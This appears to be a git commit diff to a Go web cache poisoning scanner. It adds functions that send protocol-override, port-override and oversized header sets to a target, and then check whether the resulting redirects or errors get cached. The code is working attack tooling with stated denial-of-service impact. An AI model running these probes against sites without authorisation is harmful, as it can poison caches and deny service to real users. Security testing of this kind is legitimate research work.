ff1cb8b125beab01e73f00f022a7495777551f61
ahmed-tabib <ahmed.tabib0@gmail.com>
2023-08-10 20:34:48 +0100

    added a few more attacks

--- internal/cachesnake/attacks.go
+++ internal/cachesnake/attacks.go
@@ -44,7 +44,7 @@ func pathOverrideDecisionFunc(_ [][]string, target *AttackTarget, response *fast
 	return response.StatusCode() != target.InitialResponse.StatusCode()
 }
 
-// Attempt to cause a redirect through headers
+// Attempt to cause a 404
 // Main Impact: DoS, Inappropriate Content displayed.
 func RunPathOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
 	//necessary boilerplate
@@ -101,6 +101,185 @@ func RunPathOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Du
 	} else {
 		return true, result
 	}
+}
+
+// Protocol override associated decision function
+func protoOverrideDecisionFunc(_ [][]string, target *AttackTarget, response *fasthttp.Response) bool {
+	return (response.StatusCode() != target.InitialResponse.StatusCode()) && (response.StatusCode() >= 301 && response.StatusCode() <= 308)
+}
+
+// Attempt to cause a redirect
+// Main Impact: DoS, possible redirect
+func RunProtoOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
+	//necessary boilerplate
+	target.AcquireTarget(backoff)
+	defer target.ReleaseTarget()
+	defer target.MarkRequested()
+	//clear the request and response objects, they will be reused by the next function
+	defer net_ctx.Request.Reset()
+	defer net_ctx.Response.Reset()
+
+	//If not 200 there's nothing to do
+	if target.InitialResponse.StatusCode() != 200 {
+		return false, nil
+	}
+
+	//Prepare headers & header bin search args
+	header_value_pairs := make([][]string, len(ProtocolOverrideHeaders))
+	for i := range header_value_pairs {
+		header_value_pairs[i] = []string{ProtocolOverrideHeaders[i], "http"}
+	}
+
+	args := HeaderBinarySearchArgs{
+		Target:               target,
+		NetCtx:               net_ctx,
+		UsePersistentHeaders: true,
+		UseCookies:           false,
+		HeaderValuePairs:     header_value_pairs,
+		ChunkSize:            40,
+		Backoff:              backoff,
+		DecisionFunc:         protoOverrideDecisionFunc,
+	}
+
+	//Run Binary search on Headers
+	bin_search_result := HeaderBinarySearch(&args)
+
+	if len(bin_search_result) == 0 {
+		return false, nil
+	}
+
+	//See if any results are cached
+	args.HeaderValuePairs = bin_search_result
+	cache_test_result := IsHeaderEffectCached(&args)
+
+	result := make([]string, 0, len(bin_search_result))
+
+	for i, v := range cache_test_result {
+		if v {
+			result = append(result, bin_search_result[i][0])
+		}
+	}
+
+	if len(result) == 0 {
+		return false, nil
+	} else {
+		return true, result
+	}
+}
+
+// Attempt to cause a redirect
+// Main Impact: DoS, possible permenant redirect
+func RunPortOverride(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
+	//necessary boilerplate
+	target.AcquireTarget(backoff)
+	defer target.ReleaseTarget()
+	defer target.MarkRequested()
+	//clear the request and response objects, they will be reused by the next function
+	defer net_ctx.Request.Reset()
+	defer net_ctx.Response.Reset()
+
+	//If not 200 there's nothing to do
+	if target.InitialResponse.StatusCode() != 200 {
+		return false, nil
+	}
+
+	//Prepare headers & header bin search args
+	header_value_pairs := make([][]string, len(PortOverrideHeaders))
+	for i := range header_value_pairs {
+		header_value_pairs[i] = []string{PortOverrideHeaders[i], "80"}
+	}
+
+	args := HeaderBinarySearchArgs{
+		Target:               target,
+		NetCtx:               net_ctx,
+		UsePersistentHeaders: true,
+		UseCookies:           false,
+		HeaderValuePairs:     header_value_pairs,
+		ChunkSize:            40,
+		Backoff:              backoff,
+		DecisionFunc:         pathOverrideDecisionFunc,
+		//we use the same decision function as path override
+	}
+
+	//Run Binary search on Headers
+	bin_search_result := HeaderBinarySearch(&args)
+
+	if len(bin_search_result) == 0 {
+		return false, nil
+	}
+
+	//See if any results are cached
+	args.HeaderValuePairs = bin_search_result
+	cache_test_result := IsHeaderEffectCached(&args)
+
+	result := make([]string, 0, len(bin_search_result))
+
+	for i, v := range cache_test_result {
+		if v {
+			result = append(result, bin_search_result[i][0])
+		}
+	}
+
+	if len(result) == 0 {
+		return false, nil
+	} else {
+		return true, result
+	}
+}
+
+func RunLargeHeaderCount(target *AttackTarget, net_ctx *HttpContext, backoff time.Duration) (bool, []string) {
+	//necessary boilerplate
+	target.AcquireTarget(backoff)
+	defer target.ReleaseTarget()
+	defer target.MarkRequested()
+	//clear the request and response objects, they will be reused by the next function
+	defer net_ctx.Request.Reset()
+	defer net_ctx.Response.Reset()
+
+	//Setup the request URL & method
+	net_ctx.Request.SetRequestURI(target.TargetURL)
+	net_ctx.Request.Header.SetMethod("GET")
+
+	//Set URL params & cache buster headers
+	cache_buster := GenRandString(10)
+	query_params := net_ctx.Request.URI().QueryArgs()
+	query_params.Add("cachebuster", cache_buster)
+
+	net_ctx.Request.Header.Set("Accept", "*/*, text/"+cache_buster)
+
+	//Add persistent headers if any
+	for _, h_v := range net_ctx.PersistentHeaders {
+		net_ctx.Request.Header.Set(h_v[0], h_v[1])
+	}
+
+	//Set 130 random headers
+	for i := 0; i < 130; i++ {
+		net_ctx.Request.Header.Add("X-Random-Custom-Header", GenRandString(15))
+	}
+
+	//Send the request with the header
+	err := net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
+	if err != nil {
+		return false, nil
+	}
+
+	//Note the result with the headers present
+	result_with_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()
+
+	//Remove headers
+	net_ctx.Request.Header.Del("X-Random-Custom-Header")
+
+	//Resend the request without the headers
+	err = net_ctx.Client.Do(net_ctx.Request, net_ctx.Response)
+	if err != nil {
+		return false, nil
+	}
+
+	//Note result without the header present
+	result_without_header := net_ctx.Response.StatusCode() != target.InitialResponse.StatusCode()
+
+	//The result is cached only if both tests are true
+	return result_with_header && result_without_header, nil
 }
 
 func RunCookieSearch() {
